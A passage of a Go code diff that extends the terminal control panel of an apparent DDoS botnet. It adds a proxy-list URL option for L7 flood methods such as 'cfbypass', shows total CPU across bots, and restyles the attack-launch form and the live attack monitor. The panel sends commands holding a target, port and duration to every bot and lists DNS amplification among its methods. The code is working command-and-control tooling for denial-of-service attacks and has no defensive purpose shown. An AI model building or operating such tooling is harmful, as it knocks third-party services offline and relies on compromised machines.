@@ -155,6 +155,11 @@ var attackMethods = []struct {
 	{"DNS Amp", "DNS amplification attack", "!dns"},
 }
 
+// isL7Method checks if the attack method supports proxies
+func isL7Method(cmd string) bool {
+	return cmd == "!http" || cmd == "!https" || cmd == "!tls" || cmd == "!cfbypass"
+}
+
 // TUIAttack tracks attacks launched from TUI mode
 type TUIAttack struct {
 	ID       int
@@ -181,6 +186,7 @@ type TUIModel struct {
 	// Dashboard data
 	botCount    int
 	totalRAM    int64
+	totalCPU    int
 	status      string
 	attackCount int
 
@@ -198,6 +204,7 @@ type TUIModel struct {
 	attackDuration    string
 	attackMethod      string
 	attackCmd         string
+	attackProxyURL    string // Proxy URL for L7 methods (optional)
 	attackCursor      int
 	methodCursor      int
 	attackInputActive bool // true when typing in a field
@@ -326,6 +333,7 @@ func (m TUIModel) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
 		// Refresh bot count and stats
 		m.botCount = getBotCount()
 		m.totalRAM = getTotalRAM()
+		m.totalCPU = getTotalCPU()
 		return m, tickCmd()
 
 	case ConnLogMsg:
@@ -568,14 +576,24 @@ func (m TUIModel) handleKeyPress(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
 
 	// Handle text input mode for attack form
 	if m.currentView == ViewAttack && m.attackInputActive {
+		// Determine max field index (4 if L7 method selected, otherwise 3)
+		maxField := 3
+		if isL7Method(m.attackCmd) {
+			maxField = 4 // Include proxy URL field
+		}
 		switch key {
 		case "enter":
 			m.attackInputActive = false
-			// Auto-advance to next field (target->port->duration->method)
-			if m.attackCursor < 3 {
+			// Auto-advance to next field
+			if m.attackCursor < maxField {
 				m.attackCursor++
-				if m.attackCursor < 3 {
+				// Skip to proxy field (4) if it's L7 and we're past method (3)
+				if m.attackCursor == 3 {
+					// Method field - don't auto-activate input
+				} else if m.attackCursor < maxField {
 					m.attackInputActive = true // Keep editing next field
+				} else if m.attackCursor == 4 && isL7Method(m.attackCmd) {
+					m.attackInputActive = true // Proxy URL field
 				}
 			}
 			return m, nil
@@ -596,6 +614,10 @@ func (m TUIModel) handleKeyPress(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
 				if len(m.attackDuration) > 0 {
 					m.attackDuration = m.attackDuration[:len(m.attackDuration)-1]
 				}
+			case 4:
+				if len(m.attackProxyURL) > 0 {
+					m.attackProxyURL = m.attackProxyURL[:len(m.attackProxyURL)-1]
+				}
 			}
 			return m, nil
 		default:
@@ -612,6 +634,8 @@ func (m TUIModel) handleKeyPress(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
 					if key >= "0" && key <= "9" {
 						m.attackDuration += key
 					}
+				case 4:
+					m.attackProxyURL += key
 				}
 			}
 			return m, nil
@@ -718,7 +742,12 @@ func (m TUIModel) handleKeyPress(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
 				m.botCursor++
 			}
 		case ViewAttack:
-			if m.attackCursor < 3 {
+			// Max field is 4 (proxy URL) if L7 method, otherwise 3 (method)
+			maxField := 3
+			if isL7Method(m.attackCmd) {
+				maxField = 4
+			}
+			if m.attackCursor < maxField {
 				m.attackCursor++
 			}
 		case ViewMethodSelect:
@@ -873,6 +902,7 @@ func (m TUIModel) handleKeyPress(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
 		// Refresh
 		m.botCount = getBotCount()
 		m.totalRAM = getTotalRAM()
+		m.totalCPU = getTotalCPU()
 		if m.currentView == ViewBotList {
 			m.refreshBotList()
 		}
@@ -910,6 +940,9 @@ func (m TUIModel) handleEnter() (tea.Model, tea.Cmd) {
 	case ViewAttack:
 		if m.attackCursor == 3 { // Method field selected
 			m.currentView = ViewMethodSelect
+		} else if m.attackCursor == 4 && isL7Method(m.attackCmd) {
+			// Proxy URL field - start text input
+			m.attackInputActive = true
 		} else if m.attackCursor < 3 {
 			// Start text input for target/port/duration
 			m.attackInputActive = true
@@ -976,8 +1009,13 @@ func (m TUIModel) launchAttack() (tea.Model, tea.Cmd) {
 	}
 	dur := time.Duration(durSec) * time.Second
 
-	// Build command
-	cmd := fmt.Sprintf("%s %s %s %s", m.attackCmd, m.attackTarget, m.attackPort, m.attackDuration)
+	// Build command - include proxy URL if L7 method and URL provided
+	var cmd string
+	if isL7Method(m.attackCmd) && m.attackProxyURL != "" {
+		cmd = fmt.Sprintf("%s %s %s %s -pu %s", m.attackCmd, m.attackTarget, m.attackPort, m.attackDuration, m.attackProxyURL)
+	} else {
+		cmd = fmt.Sprintf("%s %s %s %s", m.attackCmd, m.attackTarget, m.attackPort, m.attackDuration)
+	}
 
 	// Send to all bots
 	sendToBots(cmd)
@@ -1025,6 +1063,7 @@ func (m TUIModel) launchAttack() (tea.Model, tea.Cmd) {
 	m.attackDuration = "60"
 	m.attackMethod = ""
 	m.attackCmd = ""
+	m.attackProxyURL = ""
 	m.attackCursor = 0
 
 	// Return with a tick command to animate
@@ -1284,8 +1323,8 @@ func (m TUIModel) renderStatsBar() string {
 		dim.Render("Status:"), status,
 		dim.Render("│ Bots:"), green.Render(fmt.Sprintf("%d", m.botCount)),
 		dim.Render("│ RAM:"), cyan.Render(ramStr),
+		dim.Render("│ CPU:"), pink.Render(fmt.Sprintf("%d cores", m.totalCPU)),
 		dim.Render("│ Uptime:"), orange.Render(uptime),
-		dim.Render("│ Proto:"), pink.Render(PROTOCOL_VERSION),
 		dim.Render("│ TLS:"), green.Render("1.3"))
 
 	return bar
@@ -1343,185 +1382,320 @@ func (m TUIModel) viewAttack() string {
 	neonGreen := lipgloss.NewStyle().Foreground(lipgloss.Color("46"))
 	neonYellow := lipgloss.NewStyle().Foreground(lipgloss.Color("226"))
 	neonRed := lipgloss.NewStyle().Foreground(lipgloss.Color("196"))
+	neonOrange := lipgloss.NewStyle().Foreground(lipgloss.Color("208"))
+	neonPurple := lipgloss.NewStyle().Foreground(lipgloss.Color("135"))
 	dim := lipgloss.NewStyle().Foreground(lipgloss.Color("240"))
 	white := lipgloss.NewStyle().Foreground(lipgloss.Color("231"))
+	darkGray := lipgloss.NewStyle().Foreground(lipgloss.Color("236"))
+
+	// Cyberpunk box characters
+	boxTL := "╔"
+	boxTR := "╗"
+	boxBL := "╚"
+	boxBR := "╝"
+	boxH := "═"
+	boxV := "║"
+	boxML := "╠"
+	boxMR := "╣"
 
 	// Show launch animation if active
 	if m.launchAnimating {
-		b.WriteString("\n\n")
+		b.WriteString("\n")
 
-		// Animation frames (8 stages total - stages 5-7 show ATTACK LAUNCHED)
-		frames := []string{
-			"  ⚡ Initializing attack vectors...",
-			"  ⚡⚡ Targeting " + m.launchAnimTarget + "...",
-			"  ⚡⚡⚡ Deploying " + m.launchAnimMethod + "...",
-			"  ⚡⚡⚡⚡ Engaging " + fmt.Sprintf("%d", m.botCount) + " bots...",
-			"  ⚡⚡⚡⚡⚡ Sending payloads...",
-			"  ✓ ATTACK LAUNCHED!",
-			"  ✓ ATTACK LAUNCHED!",
-			"  ✓ ATTACK ACTIVE - CHECK ONGOING TAB",
+		// Glitch effect characters
+		glitchChars := []string{"░", "▒", "▓", "█", "▄", "▀", "■"}
+		glitch := func() string {
+			return glitchChars[m.launchAnimStage%len(glitchChars)]
 		}
 
-		// Cool loading bar effect
-		barWidth := 40
+		// Animation frames with cyberpunk flair
+		frames := []string{
+			"  ◈ INITIALIZING ATTACK VECTORS...",
+			"  ◈◈ ACQUIRING TARGET: " + m.launchAnimTarget,
+			"  ◈◈◈ LOADING " + m.launchAnimMethod + " MODULE...",
+			"  ◈◈◈◈ DEPLOYING " + fmt.Sprintf("%d", m.botCount) + " NODES...",
+			"  ◈◈◈◈◈ SYNCHRONIZING PAYLOADS...",
+			"  ▶ ATTACK SEQUENCE INITIATED",
+			"  ▶▶ SWARM ACTIVE",
+			"  ✓ OPERATION RUNNING",
+		}
+
+		// Cool loading bar with gradient effect
+		barWidth := 44
 		filled := (m.launchAnimStage + 1) * (barWidth / 8)
 		if filled > barWidth {
 			filled = barWidth
 		}
-		loadBar := strings.Repeat("█", filled) + strings.Repeat("░", barWidth-filled)
 
-		// Display animation
-		b.WriteString(neonPink.Bold(true).Render("  ╔════════════════════════════════════════════════╗"))
-		b.WriteString("\n")
-		b.WriteString(neonPink.Bold(true).Render("  ║"))
-		if m.launchAnimStage >= 5 {
-			b.WriteString(neonGreen.Bold(true).Render("            ✓ ATTACK LAUNCHED! ✓            "))
-		} else {
-			b.WriteString(neonCyan.Bold(true).Render("          ⚡ LAUNCHING ATTACK ⚡           "))
+		// Gradient bar
+		var loadBar string
+		for i := 0; i < barWidth; i++ {
+			if i < filled {
+				if i < filled/3 {
+					loadBar += neonPurple.Render("█")
+				} else if i < filled*2/3 {
+					loadBar += neonPink.Render("█")
+				} else {
+					loadBar += neonCyan.Render("█")
+				}
+			} else {
+				loadBar += darkGray.Render("░")
+			}
 		}
-		b.WriteString(neonPink.Bold(true).Render("║"))
-		b.WriteString("\n")
-		b.WriteString(neonPink.Bold(true).Render("  ╠════════════════════════════════════════════════╣"))
-		b.WriteString("\n")
-		b.WriteString(neonPink.Bold(true).Render("  ║"))
+
+		// Cyberpunk animated border
+		borderColor := neonPink
+		if m.launchAnimStage >= 5 {
+			borderColor = neonGreen
+		}
+
+		width := 52
+		b.WriteString(borderColor.Bold(true).Render("  "+boxTL+strings.Repeat(boxH, width)+boxTR) + "\n")
+		b.WriteString(borderColor.Bold(true).Render("  " + boxV))
+
+		// Title with glitch effect
+		if m.launchAnimStage >= 5 {
+			title := "  ◆ ATTACK SEQUENCE ACTIVE ◆  "
+			padding := (width - len(title)) / 2
+			b.WriteString(strings.Repeat(" ", padding))
+			b.WriteString(neonGreen.Bold(true).Render(title))
+			b.WriteString(strings.Repeat(" ", width-padding-len(title)))
+		} else {
+			title := fmt.Sprintf("  %s INITIATING STRIKE %s  ", glitch(), glitch())
+			padding := (width - len(title)) / 2
+			b.WriteString(strings.Repeat(" ", padding))
+			b.WriteString(neonCyan.Bold(true).Render(title))
+			b.WriteString(strings.Repeat(" ", width-padding-len(title)))
+		}
+		b.WriteString(borderColor.Bold(true).Render(boxV) + "\n")
+
+		b.WriteString(borderColor.Bold(true).Render("  "+boxML+strings.Repeat(boxH, width)+boxMR) + "\n")
+
+		// Status line
+		b.WriteString(borderColor.Bold(true).Render("  " + boxV))
 		b.WriteString("  ")
 		if m.launchAnimStage < len(frames) {
 			if m.launchAnimStage >= 5 {
-				b.WriteString(neonGreen.Bold(true).Render(fmt.Sprintf("%-44s", frames[m.launchAnimStage])))
+				b.WriteString(neonGreen.Bold(true).Render(fmt.Sprintf("%-50s", frames[m.launchAnimStage])))
 			} else {
-				b.WriteString(neonGreen.Render(fmt.Sprintf("%-44s", frames[m.launchAnimStage])))
+				b.WriteString(neonOrange.Render(fmt.Sprintf("%-50s", frames[m.launchAnimStage])))
 			}
-		} else {
-			b.WriteString(neonGreen.Bold(true).Render(fmt.Sprintf("%-44s", "  ✓ ATTACK ACTIVE!")))
 		}
-		b.WriteString(neonPink.Bold(true).Render("║"))
-		b.WriteString("\n")
-		b.WriteString(neonPink.Bold(true).Render("  ║"))
-		b.WriteString("  ")
+		b.WriteString(borderColor.Bold(true).Render(boxV) + "\n")
+
+		// Progress bar
+		b.WriteString(borderColor.Bold(true).Render("  " + boxV))
+		b.WriteString("  [")
 		if m.launchAnimStage >= 5 {
 			b.WriteString(neonGreen.Render(strings.Repeat("█", barWidth)))
 		} else {
-			b.WriteString(neonCyan.Render(loadBar))
+			b.WriteString(loadBar)
 		}
-		b.WriteString("  ")
-		b.WriteString(neonPink.Bold(true).Render("║"))
-		b.WriteString("\n")
-		b.WriteString(neonPink.Bold(true).Render("  ╠════════════════════════════════════════════════╣"))
-		b.WriteString("\n")
-		b.WriteString(neonPink.Bold(true).Render("  ║"))
+		b.WriteString("] ")
+		pct := (m.launchAnimStage + 1) * 100 / 8
+		if pct > 100 {
+			pct = 100
+		}
+		b.WriteString(neonCyan.Render(fmt.Sprintf("%3d%%", pct)))
+		b.WriteString(borderColor.Bold(true).Render(boxV) + "\n")
+
+		b.WriteString(borderColor.Bold(true).Render("  "+boxML+strings.Repeat(boxH, width)+boxMR) + "\n")
+
+		// Target info with icons
+		b.WriteString(borderColor.Bold(true).Render("  " + boxV))
 		b.WriteString(fmt.Sprintf("  %s %s  %s %s  %s %s",
-			dim.Render("Method:"), neonCyan.Render(m.launchAnimMethod),
-			dim.Render("Target:"), neonYellow.Render(m.launchAnimTarget+":"+m.launchAnimPort),
-			dim.Render("Duration:"), neonGreen.Render(m.launchAnimDur+"s")))
-		spaces := 48 - len(fmt.Sprintf("  Method: %s  Target: %s:%s  Duration: %ss", m.launchAnimMethod, m.launchAnimTarget, m.launchAnimPort, m.launchAnimDur))
-		if spaces > 0 {
-			b.WriteString(strings.Repeat(" ", spaces))
+			neonPurple.Render("◈ METHOD:"), neonCyan.Bold(true).Render(m.launchAnimMethod),
+			neonPurple.Render("◈ TARGET:"), neonYellow.Bold(true).Render(m.launchAnimTarget+":"+m.launchAnimPort),
+			neonPurple.Render("◈ TIME:"), neonGreen.Bold(true).Render(m.launchAnimDur+"s")))
+		infoLen := len("  ◈ METHOD: " + m.launchAnimMethod + "  ◈ TARGET: " + m.launchAnimTarget + ":" + m.launchAnimPort + "  ◈ TIME: " + m.launchAnimDur + "s")
+		if infoLen < width {
+			b.WriteString(strings.Repeat(" ", width-infoLen))
 		}
-		b.WriteString(neonPink.Bold(true).Render("║"))
-		b.WriteString("\n")
-		b.WriteString(neonPink.Bold(true).Render("  ╚════════════════════════════════════════════════╝"))
-		b.WriteString("\n")
+		b.WriteString(borderColor.Bold(true).Render(boxV) + "\n")
+
+		b.WriteString(borderColor.Bold(true).Render("  "+boxBL+strings.Repeat(boxH, width)+boxBR) + "\n")
 
 		return b.String()
 	}
 
-	b.WriteString(headerStyle.Render("  ⚡ ATTACK CENTER"))
+	// ═══════════════════════════════════════════════════════════════════════
+	// CYBERPUNK ATTACK CENTER HEADER
+	// ═══════════════════════════════════════════════════════════════════════
+
+	// ASCII art header
 	b.WriteString("\n")
+	headerArt := []string{
+		"    ╔═══════════════════════════════════════════════════════════╗",
+		"    ║  ▄▀▄ ▀█▀ ▀█▀ ▄▀▄ ▄▀▀ █▄▀   ▄▀▀ ██▀ █▄ █ ▀█▀ ██▀ █▀▄    ║",
+		"    ║  █▀█  █   █  █▀█ ▀▄▄ █ █   ▀▄▄ █▄▄ █ ▀█  █  █▄▄ █▀▄    ║",
+		"    ╚═══════════════════════════════════════════════════════════╝",
+	}
+	for _, line := range headerArt {
+		b.WriteString(neonCyan.Bold(true).Render(line) + "\n")
+	}
 
 	// Count ongoing attacks from both sources
 	ongoingCount := 0
-	// Telnet-launched attacks
 	for _, attack := range ongoingAttacks {
 		if time.Until(attack.start.Add(attack.duration)) > 0 {
 			ongoingCount++
 		}
 	}
-	// TUI-launched attacks
 	for _, attack := range tuiAttacks {
 		if time.Until(attack.Start.Add(attack.Duration)) > 0 {
 			ongoingCount++
 		}
 	}
 
-	b.WriteString("  ")
+	// Tab bar with cyberpunk styling
+	b.WriteString("\n    ")
 	if m.attackViewMode == 0 {
-		b.WriteString(neonCyan.Bold(true).Render(" [⚡ Launch] "))
+		b.WriteString(neonPink.Bold(true).Render("┌──────────────┐"))
+		b.WriteString(dim.Render("┌────────────────────┐"))
 	} else {
-		b.WriteString(dim.Render("  ⚡ Launch  "))
+		b.WriteString(dim.Render("┌──────────────┐"))
+		b.WriteString(neonPink.Bold(true).Render("┌────────────────────┐"))
 	}
-	if m.attackViewMode == 1 {
-		ongoingLabel := fmt.Sprintf(" [📊 Ongoing (%d)] ", ongoingCount)
+	b.WriteString("\n    ")
+	if m.attackViewMode == 0 {
+		b.WriteString(neonPink.Bold(true).Render("│"))
+		b.WriteString(neonCyan.Bold(true).Render(" ⚡ LAUNCH    "))
+		b.WriteString(neonPink.Bold(true).Render("│"))
+		b.WriteString(dim.Render("│"))
 		if ongoingCount > 0 {
-			b.WriteString(neonYellow.Bold(true).Render(ongoingLabel))
+			b.WriteString(neonYellow.Render(fmt.Sprintf(" 📡 ACTIVE [%d]    ", ongoingCount)))
 		} else {
-			b.WriteString(neonCyan.Bold(true).Render(ongoingLabel))
+			b.WriteString(dim.Render(" 📡 ACTIVE [0]    "))
 		}
+		b.WriteString(dim.Render("│"))
 	} else {
-		ongoingLabel := fmt.Sprintf("  📊 Ongoing (%d)  ", ongoingCount)
+		b.WriteString(dim.Render("│ ⚡ LAUNCH    │"))
+		b.WriteString(neonPink.Bold(true).Render("│"))
 		if ongoingCount > 0 {
-			b.WriteString(neonYellow.Render(ongoingLabel))
+			b.WriteString(neonYellow.Bold(true).Render(fmt.Sprintf(" 📡 ACTIVE [%d]    ", ongoingCount)))
 		} else {
-			b.WriteString(dim.Render(ongoingLabel))
+			b.WriteString(neonCyan.Bold(true).Render(" 📡 ACTIVE [0]    "))
 		}
+		b.WriteString(neonPink.Bold(true).Render("│"))
 	}
-	b.WriteString("\n")
-	b.WriteString(dim.Render("  " + strings.Repeat("─", 60)))
+	b.WriteString("\n    ")
+	if m.attackViewMode == 0 {
+		b.WriteString(neonPink.Bold(true).Render("└──────────────┘"))
+		b.WriteString(dim.Render("└────────────────────┘"))
+	} else {
+		b.WriteString(dim.Render("└──────────────┘"))
+		b.WriteString(neonPink.Bold(true).Render("└────────────────────┘"))
+	}
 	b.WriteString("\n\n")
 
 	if m.attackViewMode == 0 {
-		// === LAUNCH TAB ===
+		// ═══════════════════════════════════════════════════════════════════════
+		// LAUNCH TAB - Cyberpunk Form
+		// ═══════════════════════════════════════════════════════════════════════
+
 		methodDisplay := m.attackMethod
 		if methodDisplay == "" {
-			methodDisplay = "[Select Method]"
+			methodDisplay = "[ SELECT ]"
 		}
 
+		// Form fields with cyberpunk styling
 		fields := []struct {
+			icon  string
 			label string
 			value string
 			hint  string
 		}{
-			{"Target", m.attackTarget, "IP or hostname"},
-			{"Port", m.attackPort, "Target port (default: 80)"},
-			{"Duration", m.attackDuration, "Seconds (default: 30)"},
-			{"Method", methodDisplay, "Press ENTER to select"},
+			{"◈", "TARGET", m.attackTarget, "IP address or hostname"},
+			{"◈", "PORT", m.attackPort, "Target port (default: 80)"},
+			{"◈", "DURATION", m.attackDuration, "Attack duration in seconds"},
+			{"◆", "METHOD", methodDisplay, "Press ENTER to select attack type"},
 		}
+
+		// Add proxy URL field only for L7 methods
+		if isL7Method(m.attackCmd) {
+			proxyHint := "URL to proxy list file"
+			if m.attackProxyURL == "" {
+				proxyHint = "Optional - leave blank for direct"
+			}
+			fields = append(fields, struct {
+				icon  string
+				label string
+				value string
+				hint  string
+			}{"◇", "PROXY URL", m.attackProxyURL, proxyHint})
+		}
+
+		// Form box
+		b.WriteString(neonPurple.Render("    ┌─────────────────────────────────────────────────────┐") + "\n")
+		b.WriteString(neonPurple.Render("    │") + neonCyan.Bold(true).Render("           ◆ CONFIGURE ATTACK PARAMETERS ◆           ") + neonPurple.Render("│") + "\n")
+		b.WriteString(neonPurple.Render("    ├─────────────────────────────────────────────────────┤") + "\n")
 
 		for i, field := range fields {
-			cursor := "  "
-			style := menuItemStyle
-			if i == m.attackCursor {
-				cursor = "▸ "
-				style = menuSelectedStyle
+			isSelected := i == m.attackCursor
+			isEditing := m.attackInputActive && isSelected
+
+			// Line start
+			b.WriteString(neonPurple.Render("    │ "))
+
+			// Cursor/icon
+			if isSelected {
+				b.WriteString(neonPink.Bold(true).Render("▶ " + field.icon + " "))
+			} else {
+				b.WriteString(dim.Render("  " + field.icon + " "))
 			}
 
-			valueStyle := lipgloss.NewStyle().Foreground(lipgloss.Color("51"))
+			// Label
+			labelStyle := dim
+			if isSelected {
+				labelStyle = neonCyan.Bold(true)
+			}
+			b.WriteString(labelStyle.Render(fmt.Sprintf("%-10s", field.label)))
+			b.WriteString(dim.Render(": "))
+
+			// Value
 			displayValue := field.value
-			if field.value == "" || field.value == "[Select Method]" {
-				valueStyle = lipgloss.NewStyle().Foreground(lipgloss.Color("240")).Italic(true)
-				if field.value == "" {
-					displayValue = "_"
+			if displayValue == "" {
+				displayValue = "_______________"
+			}
+			if displayValue == "[ SELECT ]" {
+				if isSelected {
+					b.WriteString(neonYellow.Bold(true).Render(displayValue))
+				} else {
+					b.WriteString(dim.Italic(true).Render(displayValue))
 				}
+			} else if isEditing {
+				b.WriteString(neonGreen.Bold(true).Render(field.value))
+				b.WriteString(neonGreen.Bold(true).Render("█"))
+			} else if isSelected {
+				b.WriteString(neonCyan.Bold(true).Render(displayValue))
+			} else {
+				b.WriteString(white.Render(displayValue))
 			}
 
-			if m.attackInputActive && i == m.attackCursor && i < 3 {
-				displayValue = field.value + "█"
-				valueStyle = lipgloss.NewStyle().Foreground(lipgloss.Color("46"))
+			// Padding and hint
+			valueLen := len(displayValue)
+			if isEditing {
+				valueLen++
+			}
+			padding := 25 - valueLen
+			if padding < 0 {
+				padding = 0
+			}
+			b.WriteString(strings.Repeat(" ", padding))
+
+			if isSelected && !isEditing {
+				b.WriteString(dim.Italic(true).Render("← " + truncate(field.hint, 15)))
+			} else {
+				b.WriteString(strings.Repeat(" ", 17))
 			}
 
-			b.WriteString(fmt.Sprintf("%s%s: %s",
-				cursor,
-				style.Render(fmt.Sprintf("%-10s", field.label)),
-				valueStyle.Render(displayValue),
-			))
-			if i == m.attackCursor && !m.attackInputActive {
-				b.WriteString(dim.Render("  ← " + field.hint))
-			}
-			b.WriteString("\n")
+			b.WriteString(neonPurple.Render(" │") + "\n")
 		}
 
-		// Command preview
+		b.WriteString(neonPurple.Render("    └─────────────────────────────────────────────────────┘") + "\n")
+
+		// Command preview with cyberpunk box
 		if m.attackMethod != "" && m.attackTarget != "" {
-			b.WriteString("\n")
 			port := m.attackPort
 			if port == "" {
 				port = "80"
@@ -1530,97 +1704,162 @@ func (m TUIModel) viewAttack() string {
 			if dur == "" {
 				dur = "30"
 			}
-			cmdPreview := fmt.Sprintf("%s %s %s %s", m.attackCmd, m.attackTarget, port, dur)
-			b.WriteString(dim.Render("  Command: "))
-			b.WriteString(neonGreen.Render(cmdPreview))
+			var cmdPreview string
+			if isL7Method(m.attackCmd) && m.attackProxyURL != "" {
+				cmdPreview = fmt.Sprintf("%s %s %s %s -pu %s", m.attackCmd, m.attackTarget, port, dur, m.attackProxyURL)
+			} else {
+				cmdPreview = fmt.Sprintf("%s %s %s %s", m.attackCmd, m.attackTarget, port, dur)
+			}
 			b.WriteString("\n")
+			b.WriteString(dim.Render("    ┌─ COMMAND PREVIEW ─────────────────────────────────┐") + "\n")
+			b.WriteString(dim.Render("    │ "))
+			b.WriteString(neonGreen.Bold(true).Render("$ " + cmdPreview))
+			cmdLen := len("$ " + cmdPreview)
+			if cmdLen < 51 {
+				b.WriteString(strings.Repeat(" ", 51-cmdLen))
+			}
+			b.WriteString(dim.Render(" │") + "\n")
+			b.WriteString(dim.Render("    └───────────────────────────────────────────────────┘") + "\n")
 		}
 
 		if m.errorMessage != "" {
 			b.WriteString("\n")
-			b.WriteString(neonRed.Render("  ⚠ " + m.errorMessage))
-			b.WriteString("\n")
+			b.WriteString(neonRed.Bold(true).Render("    ⚠ ERROR: "+m.errorMessage) + "\n")
 		}
 
+		// Controls
 		b.WriteString("\n")
 		if m.attackInputActive {
-			b.WriteString(boxStyle.Render("  Type value, [enter] confirm, [esc] cancel"))
+			b.WriteString(neonPurple.Render("    ┌─ INPUT MODE ──────────────────────────────────────┐") + "\n")
+			b.WriteString(neonPurple.Render("    │ ") + neonCyan.Render("Type value") + dim.Render(" │ ") + neonGreen.Render("[ENTER]") + dim.Render(" Confirm │ ") + neonRed.Render("[ESC]") + dim.Render(" Cancel  ") + neonPurple.Render("│") + "\n")
+			b.WriteString(neonPurple.Render("    └───────────────────────────────────────────────────┘") + "\n")
 		} else {
-			b.WriteString(boxStyle.Render("  [enter] Edit  [L] Launch  [tab] Next  [→] Ongoing  [q] Back"))
+			b.WriteString(dim.Render("    ╭─────────────────────────────────────────────────────╮") + "\n")
+			b.WriteString(dim.Render("    │ "))
+			b.WriteString(neonGreen.Render("[ENTER]") + dim.Render(" Edit  "))
+			b.WriteString(neonPink.Bold(true).Render("[L]") + dim.Render(" LAUNCH  "))
+			b.WriteString(neonCyan.Render("[→]") + dim.Render(" Ongoing  "))
+			b.WriteString(neonYellow.Render("[Q]") + dim.Render(" Back   "))
+			b.WriteString(dim.Render("│") + "\n")
+			b.WriteString(dim.Render("    ╰─────────────────────────────────────────────────────╯") + "\n")
 		}
-		b.WriteString("\n")
 
 	} else {
-		// === ONGOING TAB ===
-		if ongoingCount == 0 {
-			b.WriteString(dim.Render("  No attacks currently running"))
-			b.WriteString("\n")
-		} else {
-			// Table header
-			header := fmt.Sprintf("  %-12s %-22s %-8s %-12s %s", "METHOD", "TARGET", "PORT", "REMAINING", "PROGRESS")
-			b.WriteString(dim.Render(header))
-			b.WriteString("\n")
-			b.WriteString(dim.Render("  " + strings.Repeat("─", 70)))
-			b.WriteString("\n")
+		// ═══════════════════════════════════════════════════════════════════════
+		// ONGOING TAB - Cyberpunk Attack Monitor
+		// ═══════════════════════════════════════════════════════════════════════
 
-			// Display telnet-launched attacks
+		if ongoingCount == 0 {
+			b.WriteString(neonPurple.Render("    ┌─────────────────────────────────────────────────────┐") + "\n")
+			b.WriteString(neonPurple.Render("    │") + dim.Render("                                                     ") + neonPurple.Render("│") + "\n")
+			b.WriteString(neonPurple.Render("    │") + dim.Render("          ◇ NO ACTIVE ATTACK OPERATIONS ◇           ") + neonPurple.Render("│") + "\n")
+			b.WriteString(neonPurple.Render("    │") + dim.Render("                                                     ") + neonPurple.Render("│") + "\n")
+			b.WriteString(neonPurple.Render("    │") + dim.Render("     Use the LAUNCH tab to initiate an attack        ") + neonPurple.Render("│") + "\n")
+			b.WriteString(neonPurple.Render("    │") + dim.Render("                                                     ") + neonPurple.Render("│") + "\n")
+			b.WriteString(neonPurple.Render("    └─────────────────────────────────────────────────────┘") + "\n")
+		} else {
+			// Active attacks header
+			b.WriteString(neonRed.Bold(true).Render("    ┌─ LIVE ATTACK OPERATIONS ────────────────────────────┐") + "\n")
+
+			// Table header
+			b.WriteString(neonRed.Bold(true).Render("    │ "))
+			b.WriteString(neonPurple.Bold(true).Render(fmt.Sprintf("%-10s", "METHOD")))
+			b.WriteString(dim.Render(" │ "))
+			b.WriteString(neonPurple.Bold(true).Render(fmt.Sprintf("%-18s", "TARGET")))
+			b.WriteString(dim.Render(" │ "))
+			b.WriteString(neonPurple.Bold(true).Render(fmt.Sprintf("%-6s", "TIME")))
+			b.WriteString(dim.Render(" │ "))
+			b.WriteString(neonPurple.Bold(true).Render("PROGRESS"))
+			b.WriteString(neonRed.Bold(true).Render("     │") + "\n")
+
+			b.WriteString(neonRed.Bold(true).Render("    ├──────────────────────────────────────────────────────┤") + "\n")
+
+			// Display all attacks
+			allAttacks := []struct {
+				method    string
+				target    string
+				port      string
+				remaining time.Duration
+				total     time.Duration
+			}{}
+
 			for _, attack := range ongoingAttacks {
 				remaining := time.Until(attack.start.Add(attack.duration))
 				if remaining > 0 {
-					// Progress bar
-					totalSecs := attack.duration.Seconds()
-					elapsedSecs := totalSecs - remaining.Seconds()
-					progress := elapsedSecs / totalSecs
-					barWidth := 12
-					filled := int(progress * float64(barWidth))
-					if filled > barWidth {
-						filled = barWidth
-					}
-					bar := strings.Repeat("█", filled) + strings.Repeat("░", barWidth-filled)
-
-					// Format remaining time
-					remainStr := remaining.Round(time.Second).String()
-
-					b.WriteString(fmt.Sprintf("  %s %s %s %s %s\n",
-						neonCyan.Render(fmt.Sprintf("%-12s", attack.method)),
-						white.Render(fmt.Sprintf("%-22s", truncate(attack.ip, 20))),
-						neonYellow.Render(fmt.Sprintf("%-8s", attack.port)),
-						neonGreen.Render(fmt.Sprintf("%-12s", remainStr)),
-						neonRed.Render(bar)))
+					allAttacks = append(allAttacks, struct {
+						method    string
+						target    string
+						port      string
+						remaining time.Duration
+						total     time.Duration
+					}{attack.method, attack.ip, attack.port, remaining, attack.duration})
 				}
 			}
 
-			// Display TUI-launched attacks
 			for _, attack := range tuiAttacks {
 				remaining := time.Until(attack.Start.Add(attack.Duration))
 				if remaining > 0 {
-					// Progress bar
-					totalSecs := attack.Duration.Seconds()
-					elapsedSecs := totalSecs - remaining.Seconds()
-					progress := elapsedSecs / totalSecs
-					barWidth := 12
-					filled := int(progress * float64(barWidth))
-					if filled > barWidth {
-						filled = barWidth
-					}
-					bar := strings.Repeat("█", filled) + strings.Repeat("░", barWidth-filled)
-
-					// Format remaining time
-					remainStr := remaining.Round(time.Second).String()
-
-					b.WriteString(fmt.Sprintf("  %s %s %s %s %s\n",
-						neonCyan.Render(fmt.Sprintf("%-12s", attack.Method)),
-						white.Render(fmt.Sprintf("%-22s", truncate(attack.Target, 20))),
-						neonYellow.Render(fmt.Sprintf("%-8s", attack.Port)),
-						neonGreen.Render(fmt.Sprintf("%-12s", remainStr)),
-						neonRed.Render(bar)))
+					allAttacks = append(allAttacks, struct {
+						method    string
+						target    string
+						port      string
+						remaining time.Duration
+						total     time.Duration
+					}{attack.Method, attack.Target, attack.Port, remaining, attack.Duration})
 				}
 			}
+
+			for _, atk := range allAttacks {
+				progress := 1.0 - (atk.remaining.Seconds() / atk.total.Seconds())
+				barWidth := 10
+				filled := int(progress * float64(barWidth))
+				if filled > barWidth {
+					filled = barWidth
+				}
+
+				// Gradient progress bar
+				var bar string
+				for i := 0; i < barWidth; i++ {
+					if i < filled {
+						if progress > 0.7 {
+							bar += neonRed.Render("█")
+						} else if progress > 0.4 {
+							bar += neonOrange.Render("█")
+						} else {
+							bar += neonYellow.Render("█")
+						}
+					} else {
+						bar += darkGray.Render("░")
+					}
+				}
+
